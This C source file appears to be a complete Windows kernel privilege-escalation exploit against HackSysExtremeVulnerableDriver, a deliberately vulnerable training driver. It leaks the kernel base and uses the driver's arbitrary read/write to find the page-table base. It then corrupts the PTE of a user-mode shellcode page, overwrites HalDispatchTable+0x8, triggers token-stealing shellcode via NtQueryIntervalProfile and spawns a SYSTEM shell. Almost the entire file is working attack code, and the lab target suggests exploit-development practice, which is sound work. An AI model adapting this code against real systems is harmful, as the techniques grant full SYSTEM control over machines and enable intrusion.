#include <stdio.h>
#include <Windows.h>
#include <Psapi.h>

#define IOCTL_CODE 0x0022200B

// Prepping call to nt!NtQueryIntervalProfile
typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(IN ULONG ProfileSource, OUT PULONG Interval);

unsigned long long kernelBase(void)
{
	// Defining EnumDeviceDrivers() parameters
	LPVOID lpImageBase[1024];
	DWORD lpcbNeeded;

	// Calling EnumDeviceDrivers()
	printf("[+] Calling EnumDeviceDrivers()...\n");

	BOOL baseofDrivers = EnumDeviceDrivers(
		lpImageBase,
		sizeof(lpImageBase),
		&lpcbNeeded
	);

	// Error handling
	if (!baseofDrivers)
	{
		printf("[-] Error! Unable to invoke EnumDeviceDrivers(). Error: %d\n", GetLastError());
		exit(1);
	}

	// ntoskrnl.exe is the first module dumped in the array
	// Typcasting LPVOID to unsigned long long
	unsigned long long krnlBase = (unsigned long long)lpImageBase[0];

	// Print update for kernel base
	printf("[+] Found kernel leak!\n");
	printf("[+] ntoskrnl.exe is located at: 0x%llx\n", krnlBase);

	return krnlBase;
}

// nt!MiGetPteAddress and nt!MiInitializeTransitionPfn+0x37 have the same routine
// This function dereferences all of the memory in ntoskrnl.exe via a one QWORD vanilla arbitrary read/write primitive and looks for the opcodes that make up these functions
// The base of the PTEs in each function are at the same offset of 0x13 from the beginning of the routine
unsigned long long findpteBase(void)
{
	// Return value of ntoskrnl.exe here
	unsigned long long baseAddress = kernelBase();

	// Defining variable for pointer to ntoskrnl.exe base address
	unsigned long long temporaryVariable = baseAddress;
	PULONGLONG kernelPointer = &temporaryVariable;

	// Defining variable to write the current address of ntoskrnl.exe into (0x1 byte at a time)
	unsigned long long temporaryVariable2 = NULL;
	PULONGLONG dereferencedContents = &temporaryVariable2;

	// Defining vairable to dereference the current ntoskrnl.exe address for the opcodes
	unsigned long long temporaryVariable3 = NULL;
	PULONGLONG checkSignature = &temporaryVariable3;

	// Defining buffer for looping ntoskrnl.exe
	char buf[0x10];
	size_t oneQword = 0x8;

	// Initializing buffer to junk to satisfy type error of memset and defining actual buffer
	memset(buf, 0x41, 0x10);
	memcpy(buf, &kernelPointer, oneQword);
	memcpy(&buf[0x8], &dereferencedContents, oneQword);

	// Defining buffer for dereferencing memory and searching for the nt!MiGetPteAddress signature
	char buf1[0x10];

	/*
	0: kd> u nt!MiGetPteAddress
		nt!MiGetPteAddress:
		fffff800`ef2255f4 48c1e909        shr     rcx,9
		fffff800`ef2255f8 48b8f8ffffff7f000000 mov rax,7FFFFFFFF8h
		fffff800`ef225602 4823c8          and     rcx,rax
		fffff800`ef225605 48b80000000000f5ffff mov rax,0FFFFF50000000000h
		fffff800`ef22560f 4803c1          add     rax,rcx
		fffff800`ef225612 c3              ret
		fffff800`ef225613 cc              int     3
		fffff800`ef225614 cc              int     3
	0: kd> u nt!MiInitializeTransitionPfn+0x37
		fffff801`d1a88937 48c1e909        shr     rcx,9
		fffff801`d1a8893b 48b8f8ffffff7f000000 mov rax,7FFFFFFFF8h
		fffff801`d1a88945 4823c8          and     rcx,rax
		fffff801`d1a88948 48b80000000000f5ffff mov rax,0FFFFF50000000000h
		fffff801`d1a88952 4803c8          add     rcx,rax
		fffff801`d1a88955 e89ed90200      call    nt!MI_READ_PDE (fffff801`d1ab62f8)
		fffff801`d1a8895a 488d4c2450      lea     rcx,[rsp+50h]
		fffff801`d1a8895f 4889442450      mov     qword ptr [rsp+50h],rax
	*/
	unsigned long long miSignature = 0xfff8b84809e9c148;

	// Defining lpBytesReturned parameter
	DWORD lpBytesReturned;

	// Obtaining handle to the driver
	printf("[+] Obtaining handle to the driver via CreateFileA()...\n");
	HANDLE drvHandle = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		0xC0000000,
		0x0,
		NULL,
		0x3,
		0x0,
		NULL
	);

	// Print update statement
	printf("[+] Dereferencing memory in ntoskrnl.exe to find nt!MiGetPteAddress or nt!MiInitializeTransitionPfn+0x37...\n");

	// Loop ntoskrnl.exe
	// ntoskrnl.exe ~ 0x822000 bytes
	for (int i = 0; i < 0x822000; i++)
	{
		// Extract current address of ntoskrnl.exe (0x1 byte at a time increase) to dereferencedContents
		DeviceIoControl(
			drvHandle,
			IOCTL_CODE,
			buf,
			sizeof(buf),
			NULL,
			0,
			&lpBytesReturned,
			NULL
		);

		// Actual extraction of the current memory address in ntoskrnl.exe being checked
		unsigned long long temporaryVariable4 = *dereferencedContents;

		// Initializing buffer to junk to satisfy type error of memset and defining actual buffer
		memset(buf1, 0x41, 0x10);
		memcpy(buf1, &temporaryVariable4, oneQword);
		memcpy(&buf1[0x8], &checkSignature, oneQword);

		// Extract opcodes from current address in ntoskrnl.exe to prepare signature check
		DeviceIoControl(
			drvHandle,
			IOCTL_CODE,
			buf1,
			sizeof(buf1),
			NULL,
			0,
			&lpBytesReturned,
			NULL
		);

		// Dereference contents of arbitrary write to extract current address
		unsigned long long miCheck = *checkSignature;

		if (miCheck == miSignature)
		{
			unsigned long long mitemporaryAddress = temporaryVariable4;
			unsigned long long miAddress = mitemporaryAddress+0x13;
			printf("[+] Found either nt!MiGetPteAddress or nt!MiInitializeTransitionPfn+0x37!\n");
			printf("[+] The address 0x%llx points to the base of the page table entries!\n", miAddress);

			return miAddress;
		}
		else
		{
			// Didn't find the intended address? Increase the current address one byte
			temporaryVariable++;
		}
	}

	// We aren't passing our handle to the driver to the next function, so close it
	CloseHandle(
		drvHandle
	);
}

// Extract PTE base, create shellcode, calculate PTE of shellcode, extract PTE control bits, 
void exploitWork(void)
{
	// Store pointer to PTEs in holdPtes variable
	unsigned long long ptePointer = findpteBase();

	// Create variable + pointer to extract base of the PTEs
	unsigned long long temporaryVariable5 = NULL;
	PULONGLONG pteExtract = &temporaryVariable5;

	// Defining buffer for looping ntoskrnl.exe
	char buf2[0x10];
	size_t oneQword = 0x8;

	// Initializing buffer to junk to satisfy type error of memset and defining actual buffer
	memset(buf2, 0x41, 0x10);
	memcpy(buf2, &ptePointer, oneQword);
	memcpy(&buf2[0x8], &pteExtract, oneQword);

	// Open handle again to the driver
	HANDLE drvHandle = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		0xC0000000,
		0x0,
		NULL,
		0x3,
		0x0,
		NULL
	);

	// Defining lpBytesReturned parameter
	DWORD lpBytesReturned;

	// Send buffer to the driver
	DeviceIoControl(
		drvHandle,
		IOCTL_CODE,
		buf2,
		sizeof(buf2),
		NULL,
		0,
		&lpBytesReturned,
		NULL
	);

	// Extract PTE base
	unsigned long long pteBase = *pteExtract;

	// Print update
	printf("[+] Successfully extracted the base of the page table entries!\n");
	printf("[+] The base of the PTEs are located at: 0x%llx\n", pteBase);

	// Creating shellcode
	/*
		[BITS 64]
		_start:
			mov rax, [gs:0x188]		; Current thread (_KTHREAD)
			mov rax, [rax + 0xb8]		; Current process (_EPROCESS)
			mov rbx, rax			; Copy current process (_EPROCESS) to rbx
		__loop:
			mov rbx, [rbx + 0x2e8] 		; ActiveProcessLinks
			sub rbx, 0x2e8			; Go back to current process (_EPROCESS)
			mov rcx, [rbx + 0x2e0] 		; UniqueProcessId (PID)
			cmp rcx, 4 			; Compare PID to SYSTEM PID
			jnz __loop			; Loop until SYSTEM PID is found
			mov rcx, [rbx + 0x358]		; SYSTEM token is @ offset _EPROCESS + 0x358
			and cl, 0xf0			; Clear out _EX_FAST_REF RefCnt
			mov [rax + 0x358], rcx		; Copy SYSTEM token to current process
			xor rax, rax			; STATUS_SUCCESS
			ret				; Done!
	*/

	// Windows 10 RS1 offsets in _EPROCESS structure
	char payload[] = "\x65\x48\x8B\x04\x25\x88\x01\x00\x00"
		"\x48\x8B\x80\xB8\x00\x00\x00"
		"\x48\x89\xC3\x48\x8B\x9B\xF0\x02\x00\x00"
		"\x48\x81\xEB\xF0\x02\x00\x00"
		"\x48\x8B\x8B\xE8\x02\x00\x00"
		"\x48\x83\xF9\x04\x75\xE5"
		"\x48\x8B\x8B\x58\x03\x00\x00"
		"\x80\xE1\xF0\x48\x89\x88\x58\x03\x00\x00"
		"\x48\x31\xC0\xC3";

	// Allocating shellcode in user mode
	LPVOID shellcode = VirtualAlloc(
		NULL,
		sizeof(payload),
		0x3000,
		0x40
	);

	// Error handling
	if (!shellcode)
	{
		printf("[-] Error! Unable to allocate shellcode in user mode. Error: %d\n", GetLastError());
		exit(1);
	}

	// Moving memory into allocated space in user mode
	RtlMoveMemory(
		shellcode,
		payload,
		sizeof(payload)
	);

	// Print update for shellcode
	printf("[+] Shellcode is located at: 0x%llx\n", shellcode);

	// Bitwise operations to locate PTE of shellcode page
	unsigned long long shellcodePte = (unsigned long long)shellcode >> 9;
	shellcodePte = shellcodePte & 0x7FFFFFFFF8;
	shellcodePte = shellcodePte + pteBase;

	// Print update for shellcode's PTE page
	printf("[+] Shellcode's PTE is located at: 0x%llx\n", shellcodePte);

	// Defining pointer to extract shellcode's PTE control bits (must initialize pointer, hence placeholder)
	unsigned long long temporaryVariable6 = 0;
	PULONGLONG ptecontrolbitsPointer = &temporaryVariable6;

	// Defining buffer to send to driver
	char buf3[0x10];

	// Initializing buffer to junk to satisfy type error of memset
	memset(buf3, 0x41, 0x10);

	// Actual buffer for extracting PTE control bits
	memcpy(buf3, &shellcodePte, oneQword);
	memcpy(&buf3[0x8], &ptecontrolbitsPointer, oneQword);

	// Sending buffer to the driver
	DeviceIoControl(
		drvHandle,
		IOCTL_CODE,
		buf3,
		sizeof(buf3),
		NULL,
		0,
		&lpBytesReturned,
		NULL
	);

	// Extracting the PTE control bits
	unsigned long long ptecontrolBits = (unsigned long long) * ptecontrolbitsPointer;

	// Print update for PTE control bits
	printf("[+] PTE control bits for shellcode page: %p\n", ptecontrolBits);

	// Corrupting U/S bit in PTE to make user mode page become kernel mode
	unsigned long long taintedPte;
	taintedPte = ptecontrolBits & 0xFFFFFFFFFFFFFFFB;

	// Defining pointer for corrupted PTE bits
	PULONGLONG taintedptePointer = &taintedPte;

	// Defining buffer to send to driver
	char buf4[0x10];

	// Initializing buffer to junk to satisfy type error of memset
	memset(buf4, 0x41, 0x10);

	// Actual buffer for corrupting PTE
	memcpy(buf4, &taintedptePointer, oneQword);
	memcpy(&buf4[0x8], &shellcodePte, oneQword);

	// Print update for corrupting PTE
	printf("[+] Corrupting PTE of shellcode to make U/S bit kernel mode...\n");

	// Sending buffer to the driver
	DeviceIoControl(
		drvHandle,
		IOCTL_CODE,
		buf4,
		sizeof(buf4),
		NULL,
		0,
		&lpBytesReturned,
		NULL
	);

	// Print update for corrupted PTE
	printf("[+] PTE of shellcode is now kernel mode!\n");

	// Return value from ntoskrnl.exe base function to exploitWork() to calculate nt!HalDispatchTable
	unsigned long long baseAddress1 = kernelBase();

	// Locating nt!HalDispatchTable+0x8
	unsigned long long haldispatchTable8;

	// Load kernel modules
	HMODULE base = LoadLibraryExA(
		"ntoskrnl.exe",
		NULL,
		0x1
	);

	// Locate nt!HalDispatchTable+0x8
	PVOID functionAddr = GetProcAddress(
		base,
		"HalDispatchTable"
	);

	haldispatchTable8 = (baseAddress1 + (ULONG_PTR)functionAddr) - (ULONG_PTR)base + 0x8;

	// Print update
	printf("[+] Found nt!HalDispatchTable+0x8 at: 0xllx\n", haldispatchTable8);

	// Defining pointer to write [nt!HalDispatchTable+0x8]
	unsigned long long temporaryVariable7 = 0;
	PULONGLONG preserveHal = &temporaryVariable7;

	// Defining buffer to send to driver
	char buf5[0x10];

	// Initializing buffer to junk to satisfy type error of memset
	memset(buf5, 0x41, 0x10);

	// Actual buffer for extracting the legitimate [nt!HalDispatchTable+0x8]
	memcpy(buf5, &haldispatchTable8, oneQword);
	memcpy(&buf5[0x8], &preserveHal, oneQword);

	// Sending buffer to the driver
	DeviceIoControl(
		drvHandle,
		IOCTL_CODE,
		buf5,
		sizeof(buf5),
		NULL,
		0,
		&lpBytesReturned,
		NULL
	);

	// Defining variable to place [nt!HalDispatchTable+0x8]
	unsigned long long legitimateHal = (unsigned long long) * preserveHal;

	// Print update for preserving [nt!HalDispatchTable]
	printf("[+] nt!HalDispatchTable+0x8->hal!HaliQuerySystemInformation is located at: 0x%llx\n", legitimateHal);

	// Defining pointer for shellcode (shellcode is alread LPVOID, so setting pointer to shellcode as LPVOID to avoid type cast)
	LPVOID shellcodePointer = &shellcode;

	// Defining buffer to send to driver
	char buf6[0x10];

	// Initializing buffer to junk to satisfy type error of memset
	memset(buf6, 0x41, 0x10);

	// Actual buffer for overwriting [nt!HalDispatchTable+0x8] with shellcode address
	memcpy(buf6, &shellcodePointer, oneQword);
	memcpy(&buf6[0x8], &haldispatchTable8, oneQword);

	// Sending buffer to the driver
	DeviceIoControl(
		drvHandle,
		IOCTL_CODE,
		buf6,
		sizeof(buf6),
		NULL,
		0,
		&lpBytesReturned,
		NULL
	);

	// Print update for overwriting [nt!HalDispatchTable+0x8]
	printf("[+] Overwrote [nt!HalDispatchTable+0x8] with shellcode address...\n");

	// Locating nt!NtQueryIntervalProfile
	NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(
		GetModuleHandle(
			TEXT("ntdll.dll")),
		"NtQueryIntervalProfile"
	);

	// Error handling
	if (!NtQueryIntervalProfile)
	{
		printf("[-] Error! Unable to find ntdll!NtQueryIntervalProfile! Error: %d\n", GetLastError());
		exit(1);
	}

	// Print update for found ntdll!NtQueryIntervalProfile
	printf("[+] Located ntdll!NtQueryIntervalProfile at: 0x%llx\n", NtQueryIntervalProfile);

	// Invoking nt!NtQueryIntervalProfile to execute [nt!HalDispatchTable+0x8]
	printf("[+] Calling nt!NtQueryIntervalProfile to execute [nt!HalDispatchTable+0x8]...\n");

	// Print update for found ntdll!NtQueryIntervalProfile
	// Calling nt!NtQueryIntervalProfile and defining parameter
	ULONG exploit = 0;
	NtQueryIntervalProfile(
		0x1234,
		&exploit
	);

	// Restoring [nt!HalDispatchTable+0x8]

	// Defining pointer for [nt!HalDispatchTable+0x8]
	PULONGLONG restoreHal = &legitimateHal;

	// Print update for restoring [nt!HalDispatchTable+0x8]
	printf("[+] Attempting to restore [nt!HalDispatchTable+0x8] with hal!HaliQuerySystemInformation...\n");

	// Defining buffer to send to driver
	char buf7[0x10];

	// Initializing buffer to junk to satisfy type error of memset
	memset(buf7, 0x41, 0x10);

	// Actual buffer for overwriting [nt!HalDispatchTable+0x8] with shellcode address
	memcpy(buf7, &restoreHal, oneQword);
	memcpy(&buf7[0x8], &haldispatchTable8, oneQword);

	// Sending buffer to the driver
	DeviceIoControl(
		drvHandle,
		IOCTL_CODE,
		buf7,
		sizeof(buf7),
		NULL,
		0,
		&lpBytesReturned,
		NULL
	);

	// Print update for newly restored [nt!HalDispatchTable+0x8]
	printf("[+] Restored [nt!HalDispatchTable+0x8]!\n");

	// Print update for NT AUTHORITY\SYSTEM shell
	printf("[+] Enjoy the NT AUTHORITY\\SYSTEM shell!\n");

	// Spawning an NT AUTHORITY\SYSTEM shell
	system("cmd.exe /c cmd.exe /K cd C:\\");

}

int main(void)
{
	exploitWork();

	return 0;
}
